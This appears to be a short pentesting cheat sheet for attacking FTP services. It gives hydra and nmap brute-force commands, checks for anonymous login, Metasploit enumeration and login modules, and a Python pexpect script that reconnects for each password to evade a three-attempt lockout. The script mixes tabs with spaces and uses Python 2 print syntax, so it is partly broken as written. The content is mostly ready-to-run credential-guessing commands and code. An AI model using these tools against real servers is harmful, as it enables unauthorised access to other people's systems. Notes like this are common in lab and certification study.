# FTP 
#FTP
## hydra brute force log in

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $IP -t 4 ftp
```

## nmap
`--script ftp-brute --script-agrs userdb=<db> -p 21`
script doesn't need password file. it uses nmap default

check for anon login with #nmap
`--script ftp-anon`

also try via login `ftp anonymous@$IP` without password

## metasploit enumeration

Filtering search results
```
search type:auxiliary name:ftp
```

Version scanning:
```
scanner/ftp/ftp_version
```
Note: easier to just nmap in most cases. 

Brute force module
```
/auxiliary/scanner/ftp/ftp_login
```

A custom script to attempt the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.

```python
import pexpect
import sys
username=sys.argv[2]
password_dict=sys.argv[3]

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

itr = 0
# Iterating over dictionary
for password in lines:
	child = pexpect.spawn ('ftp '+sys.argv[1])
	child.expect ('Name .*: ')
	child.sendline (username)
    print "Trying with password: ",password
	child.expect ('Password:')
	child.sendline (password)
	i = child.expect (['Login successful', 'Login failed'])
	if i==1:
		#print('Login failed')
		child.kill(0)
	elif i==0:
		print "Login Successful for ",password
		print child.before
		break
```

Then run via:
```bash
python $FILE.py $IP $USER /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

